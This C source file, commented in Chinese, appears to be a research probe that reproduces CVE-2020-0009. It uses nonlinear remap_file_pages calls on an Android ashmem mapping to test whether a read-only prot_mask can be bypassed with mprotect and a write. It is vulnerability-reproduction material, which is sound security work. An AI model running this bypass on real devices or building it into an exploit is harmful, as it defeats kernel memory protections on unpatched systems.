/* CVE-2020-0009 —— P2 补测：非线性 remap_file_pages（P4.63）
 *
 * 上一版用 pgoff=0，正好等于 linear_page_index(vma,start)=0，
 * 命中 mm/fremap.c 的早退分支（`if (pgoff == linear_page_index) { err=0; goto out; }`），
 * 等于没测到非线性路径。本程序改用 pgoff≠0，并检查：
 *   1) remap_file_pages 是否成功建出非线性 VMA
 *   2) 如果成功，mprotect(RW) 是否仍被 prot_mask 挡住
 *
 * 判定逻辑：
 *   - remap 返回 EINVAL → 3.4 不支持该 VMA 的非线性重映射，P2 无路径
 *   - remap 成功 + mprotect EACCES → 机制存在但 prot_mask 仍生效，P2 不可利用
 *   - remap 成功 + mprotect OK   → P2 成立，CVE 可复现
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define __ASHMEMIOC		0x77
#define ASHMEM_SET_SIZE		_IOW(__ASHMEMIOC, 3, size_t)
#define ASHMEM_SET_PROT_MASK	_IOW(__ASHMEMIOC, 5, unsigned long)

#ifndef SYS_remap_file_pages
#define SYS_remap_file_pages	253
#endif

#define NPAGES	4
#define SZ	(NPAGES * 0x1000)

/* 打印当前映射里属于我们这段 VMA 的那一行，看是否出现 nonlinear 特征 */
static void show_vma(void *addr)
{
	FILE *f = fopen("/proc/self/maps", "r");
	char line[512];
	unsigned long a = (unsigned long)addr;

	if (!f) return;
	while (fgets(line, sizeof line, f)) {
		unsigned long lo, hi;
		if (sscanf(line, "%lx-%lx", &lo, &hi) == 2 &&
		    a >= lo && a < hi) {
			printf("    maps: %s", line);
			break;
		}
	}
	fclose(f);
}

int main(void)
{
	int fd;
	char *p;
	long r;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("=== CVE-2020-0009 P2 nonlinear remap probe ===\n");

	fd = open("/dev/ashmem", O_RDWR);
	if (fd < 0) { printf("[!] open: %s\n", strerror(errno)); return 1; }
	if (ioctl(fd, ASHMEM_SET_SIZE, (size_t)SZ) < 0) {
		printf("[!] SET_SIZE: %s\n", strerror(errno)); return 1;
	}
	if (ioctl(fd, ASHMEM_SET_PROT_MASK, (unsigned long)PROT_READ) < 0) {
		printf("[!] SET_PROT_MASK: %s\n", strerror(errno)); return 1;
	}

	p = mmap(NULL, SZ, PROT_READ, MAP_SHARED, fd, 0);
	if (p == MAP_FAILED) { printf("[!] mmap: %s\n", strerror(errno)); return 1; }
	printf("[1] RO map %d pages @%p\n", NPAGES, p);
	show_vma(p);

	/* 关键：pgoff=1 ≠ linear_page_index(vma, p)=0，走非线性分支 */
	errno = 0;
	r = syscall(SYS_remap_file_pages, p, 0x1000, 0, 1, 0);
	printf("[2] remap_file_pages(pgoff=1) -> %ld (%s)\n",
	       r, r ? strerror(errno) : "ok");
	show_vma(p);

	/* pgoff=2 再来一次，确认不是单点行为 */
	errno = 0;
	r = syscall(SYS_remap_file_pages, p + 0x1000, 0x1000, 0, 2, 0);
	printf("[3] remap_file_pages(p+4k, pgoff=2) -> %ld (%s)\n",
	       r, r ? strerror(errno) : "ok");
	show_vma(p);

	/* 无论上一步成立与否，都试一次 mprotect —— 这一步才是判据 */
	if (mprotect(p, SZ, PROT_READ | PROT_WRITE) < 0) {
		printf("[4] mprotect(RW) fail: %s -> prot_mask 仍生效，P2 不可利用\n",
		       strerror(errno));
	} else {
		p[0] = 'X';
		printf("[4] mprotect(RW) OK, wrote %02x -> *** P2 REPRODUCED ***\n",
		       (unsigned char)p[0]);
	}

	printf("=== done ===\n");
	return 0;
}
